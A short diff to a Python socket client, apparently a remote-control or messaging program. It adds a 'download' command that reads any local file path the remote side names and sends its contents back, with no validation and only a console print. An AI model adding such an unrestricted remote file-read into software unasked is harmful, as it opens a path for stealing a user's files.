@@ -36,6 +36,10 @@ class Client():
         with open(name, 'wb') as file:
             file.write(content)
 
+    def send_file(self,location):
+        with open(location, 'rb') as file:
+            return Message(file.read(), 1)
+
     def communicate(self):
         while True:
             data = self.receive()
@@ -52,6 +56,10 @@ class Client():
                 content = self.receive_binary()
                 self.save_file(name, content)
                 self.s.send(Message('file received succesfully!', 0).message)
+            elif data[:8] == 'download':
+                location = data[9:]
+                print(location, 'is uploading')
+                self.s.send(self.send_file(location).message)
             elif data[:5] == 'alert':
                 print('alert received')
                 alert_msg = data[6:]
